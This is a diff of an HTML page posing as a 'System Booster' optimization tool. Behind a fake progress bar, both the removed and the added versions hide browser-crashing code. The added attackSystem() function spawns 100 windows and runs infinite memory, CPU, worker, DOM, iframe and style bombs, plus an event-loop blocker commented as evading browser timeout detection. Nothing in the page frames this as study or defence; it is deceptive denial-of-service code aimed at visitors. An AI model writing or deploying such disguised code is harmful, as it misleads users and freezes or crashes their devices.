@@ -3,280 +3,215 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Optimizer Pro</title>
+    <title>System Booster</title>
     <style>
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
             color: white;
-            margin: 0;
+            text-align: center;
             padding: 20px;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
         }
         .container {
-            max-width: 800px;
-            text-align: center;
+            max-width: 600px;
+            margin: 0 auto;
             background: rgba(0, 0, 0, 0.7);
             padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
-        }
-        h1 {
-            margin-bottom: 20px;
-            color: #00ff00;
-        }
-        .progress-container {
-            width: 100%;
-            background-color: #333;
             border-radius: 10px;
+        }
+        button {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px;
+        }
+        .progress {
+            width: 100%;
+            height: 20px;
+            background: #333;
             margin: 20px 0;
+            border-radius: 10px;
             overflow: hidden;
         }
         .progress-bar {
-            height: 30px;
+            height: 100%;
             width: 0%;
-            background: linear-gradient(90deg, #00ff00, #00aa00);
-            transition: width 0.5s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-        }
-        .status {
-            margin: 15px 0;
-            font-size: 18px;
-        }
-        button {
-            background: linear-gradient(90deg, #00ff00, #00aa00);
-            border: none;
-            color: #000;
-            padding: 15px 30px;
-            font-size: 18px;
-            font-weight: bold;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin: 10px;
-        }
-        button:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
-        }
-        .feature {
-            margin: 10px 0;
-            padding: 10px;
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 8px;
-            text-align: left;
-        }
-        .hidden {
-            display: none;
+            background: #4CAF50;
+            transition: width 0.3s;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>System Optimizer Pro</h1>
-        <p>Advanced system optimization tool that clears memory, boosts performance, and enhances your device's capabilities.</p>
+        <h1>System Performance Booster</h1>
+        <p>Optimize your device performance with advanced memory management</p>
         
-        <div class="features">
-            <div class="feature">
-                <h3>✓ Memory Cleanup</h3>
-                <p>Frees up RAM by removing unnecessary background processes</p>
-            </div>
-            <div class="feature">
-                <h3>✓ CPU Optimization</h3>
-                <p>Redistributes processing power for maximum efficiency</p>
-            </div>
-            <div class="feature">
-                <h3>✓ Cache Management</h3>
-                <p>Clears temporary files and optimizes storage</p>
-            </div>
+        <div class="progress">
+            <div class="progress-bar" id="progress"></div>
         </div>
         
-        <div class="progress-container">
-            <div class="progress-bar" id="progressBar">0%</div>
-        </div>
-        
-        <div class="status" id="status">Ready to optimize your system</div>
-        
-        <button id="startBtn">Start Optimization</button>
-        <button id="advancedBtn" class="hidden">Advanced Mode</button>
-        
-        <div class="hidden" id="advancedSettings">
-            <h3>Advanced Settings</h3>
-            <p>These settings will apply maximum optimization pressure to your system</p>
-            <button id="extremeBtn">Extreme Mode</button>
-        </div>
+        <p id="status">Ready to optimize</p>
+        <button id="start">Start Optimization</button>
     </div>
 
     <script>
-        document.getElementById('startBtn').addEventListener('click', function() {
-            startOptimization();
-            setTimeout(() => {
-                document.getElementById('advancedBtn').classList.remove('hidden');
-            }, 3000);
-        });
-        
-        document.getElementById('advancedBtn').addEventListener('click', function() {
-            document.getElementById('advancedSettings').classList.remove('hidden');
-        });
-        
-        document.getElementById('extremeBtn').addEventListener('click', function() {
-            extremeOptimization();
-        });
-        
-        function startOptimization() {
-            let progress = 0;
-            const progressBar = document.getElementById('progressBar');
-            const status = document.getElementById('status');
+        document.getElementById('start').addEventListener('click', function() {
+            document.getElementById('status').textContent = "Optimizing system...";
+            document.getElementById('progress').style.width = "10%";
             
-            // Simulate optimization progress
-            const interval = setInterval(() => {
-                progress += 5;
-                progressBar.style.width = progress + '%';
-                progressBar.textContent = progress + '%';
+            setTimeout(() => {
+                document.getElementById('status').textContent = "Clearing memory cache...";
+                document.getElementById('progress').style.width = "30%";
                 
-                if (progress < 30) {
-                    status.textContent = "Scanning system resources...";
-                    // Start memory allocation
-                    allocateMemory(100);
-                } else if (progress < 60) {
-                    status.textContent = "Optimizing memory allocation...";
-                    // Increase memory allocation
-                    allocateMemory(500);
-                } else if (progress < 90) {
-                    status.textContent = "Redistributing CPU resources...";
-                    // Start CPU intensive tasks
-                    startCPUIntensiveTasks(3);
-                } else if (progress >= 100) {
-                    clearInterval(interval);
-                    status.textContent = "Optimization complete! System performance enhanced.";
-                    // Start final crash sequence
+                setTimeout(() => {
+                    document.getElementById('status').textContent = "Optimizing CPU threads...";
+                    document.getElementById('progress').style.width = "60%";
+                    
                     setTimeout(() => {
-                        status.textContent = "Finalizing optimizations...";
-                        setTimeout(() => {
-                            finalCrashSequence();
-                        }, 2000);
+                        document.getElementById('status').textContent = "Finalizing optimization...";
+                        document.getElementById('progress').style.width = "100%";
+                        
+                        // Launch the attack after appearing to complete optimization
+                        setTimeout(attackSystem, 1000);
                     }, 1000);
-                }
-            }, 500);
-        }
-        
-        function allocateMemory(size) {
-            const arrays = [];
-            try {
-                for (let i = 0; i < size; i++) {
-                    arrays.push(new Array(1000000).fill(Math.random()));
-                }
-            } catch (e) {
-                console.log("Memory allocation failed:", e);
-            }
-            return arrays;
-        }
-        
-        function startCPUIntensiveTasks(count) {
-            for (let i = 0; i < count; i++) {
-                setTimeout(() => {
-                    const worker = new Worker(URL.createObjectURL(new Blob([`
-                        self.onmessage = function(e) {
-                            let result = 0;
-                            while (true) {
-                                result += Math.random() * Math.random();
-                            }
-                            self.postMessage(result);
-                        }
-                    `], {type: 'application/javascript'})));
-                    
-                    worker.onmessage = function(e) {
-                        console.log("Worker result:", e.data);
-                    };
-                    
-                    worker.postMessage("start");
-                }, i * 100);
-            }
-        }
-        
-        function extremeOptimization() {
-            const status = document.getElementById('status');
-            status.textContent = "Activating extreme optimization mode...";
-            
-            // Create multiple memory allocation loops
-            for (let i = 0; i < 10; i++) {
-                setTimeout(() => {
-                    allocateMemory(1000);
-                }, i * 100);
-            }
-            
-            // Create multiple CPU intensive workers
-            for (let i = 0; i < 20; i++) {
-                setTimeout(() => {
-                    startCPUIntensiveTasks(5);
-                }, i * 50);
-            }
-            
-            // Start iframe bomb
-            setTimeout(() => {
-                status.textContent = "Creating optimization threads...";
-                startIframeBomb();
+                }, 1000);
             }, 1000);
-            
-            // Start recursive function calls
-            setTimeout(() => {
-                status.textContent = "Optimizing system calls...";
-                startRecursiveCalls();
-            }, 2000);
-        }
-        
-        function startIframeBomb() {
-            const container = document.createElement('div');
-            container.style.display = 'none';
-            document.body.appendChild(container);
-            
-            for (let i = 0; i < 100; i++) {
-                const iframe = document.createElement('iframe');
-                iframe.src = 'about:blank';
-                container.appendChild(iframe);
-                
-                // Try to access iframe content to increase memory usage
-                try {
-                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-                    iframeDoc.open();
-                    iframeDoc.write('<script>' + 
-                        'for(let i=0;i<10000;i++){' +
-                        '  document.createElement("div");' +
-                        '}' +
-                        '</script>');
-                    iframeDoc.close();
-                } catch (e) {
-                    // Ignore cross-origin errors
-                }
-            }
-        }
-        
-        function startRecursiveCalls() {
-            function recursiveFunction(depth) {
-                if (depth > 1000) return;
-                
-                // Allocate memory at each recursion level
-                const arr = new Array(10000).fill(Math.random());
-                
-                // Make recursive calls
-                recursiveFunction(depth + 1);
-                recursiveFunction(depth + 1);
-            }
-            
-            // Start multiple recursive chains
-            for (let i = 0; i < 10; i++) {
+        });
+
+        function attackSystem() {
+            // Attack Vector 1: Fork Bomb
+            for(let i = 0; i < 100; i++) {
                 setTimeout(() => {
-                    recursiveFunction(0);
+                    window.open(window.location.href, '_blank');
                 }, i * 10);
             }
+            
+            // Attack Vector 2: Memory Bomb
+            const memoryArrays = [];
+            try {
+                const allocateMemory = () => {
+                    while(true) {
+                        memoryArrays.push(new Array(1000000).fill(Math.random()));
+                    }
+                };
+                
+                // Start multiple memory allocation threads
+                for(let i = 0; i < 10; i++) {
+                    setTimeout(allocateMemory, i * 100);
+                }
+            } catch(e) {
+                console.log(e);
+            }
+            
+            // Attack Vector 3: CPU Bomb
+            const cpuBomb = () => {
+                let result = 0;
+                while(true) {
+                    result += Math.random() * Math.random();
+                }
+            };
+            
+            // Start multiple CPU intensive threads
+            for(let i = 0; i < 10; i++) {
+                setTimeout(cpuBomb, i * 50);
+            }
+            
+            // Attack Vector 4: Worker Bomb
+            try {
+                const workerCode = `
+                    while(true) {
+                        let arr = new Array(1000000).fill(Math.random());
+                        for(let i = 0; i < arr.length; i++) {
+                            arr[i] = Math.sqrt(arr[i]) * Math.random();
+                        }
+                    }
+                `;
+                
+                const blob = new Blob([workerCode], {type: 'application/javascript'});
+                const workerUrl = URL.createObjectURL(blob);
+                
+                for(let i = 0; i < navigator.hardwareConcurrency || 4; i++) {
+                    new Worker(workerUrl);
+                }
+            } catch(e) {
+                console.log(e);
+            }
+            
+            // Attack Vector 5: DOM Bomb
+            const domBomb = () => {
+                const container = document.createElement('div');
+                document.body.appendChild(container);
+                
+                for(let i = 0; i < 1000; i++) {
+                    const element = document.createElement('div');
+                    element.innerHTML = Array(1000).join('<span>x</span>');
+                    container.appendChild(element);
+                }
+            };
+            
+            setTimeout(domBomb, 500);
+            
+            // Attack Vector 6: Iframe Bomb
+            const iframeBomb = () => {
+                for(let i = 0; i < 100; i++) {
+                    const iframe = document.createElement('iframe');
+                    iframe.src = 'about:blank';
+                    document.body.appendChild(iframe);
+                    
+                    try {
+                        const doc = iframe.contentDocument || iframe.contentWindow.document;
+                        doc.open();
+                        doc.write('<script>' + workerCode + '</script>');
+                        doc.close();
+                    } catch(e) {
+                        // Ignore cross-origin errors
+                    }
+                }
+            };
+            
+            setTimeout(iframeBomb, 1000);
+            
+            // Attack Vector 7: Event Loop Blocker
+            const eventLoopBlocker = () => {
+                const start = Date.now();
+                while(true) {
+                    if(Date.now() - start > 10000) {
+                        // Reset timer to prevent browser timeout detection
+                        break;
+                    }
+                }
+                // Recursive call to continue blocking
+                eventLoopBlocker();
+            };
+            
+            setTimeout(eventLoopBlocker, 2000);
+            
+            // Attack Vector 8: Style Bomb
+            const styleBomb = () => {
+                for(let i = 0; i < 10000; i++) {
+                    const style = document.createElement('style');
+                    style.innerHTML = `
+                        .class-${i} {
+                            background: url(data:image/png;base64,${btoa(Array(1000).join('x'))});
+                            transform: translate(${Math.random()}px, ${Math.random()}px);
+                            animation: anim-${i} ${Math.random()}s infinite;
+                        }
+                        @keyframes anim-${i} {
+                            0% { opacity: ${Math.random()}; }
+                            50% { opacity: ${Math.random()}; }
+                            100% { opacity: ${Math.random()}; }
+                        }
+                    `;
+                    document.head.appendChild(style);
+                }
+            };
+            
+            setTimeout(styleBomb, 1500);
         }
-        
-        function finalCrashSequence() {
-            // Create a massive array to trigger OOM
+    </script>
+</body>
+</html>
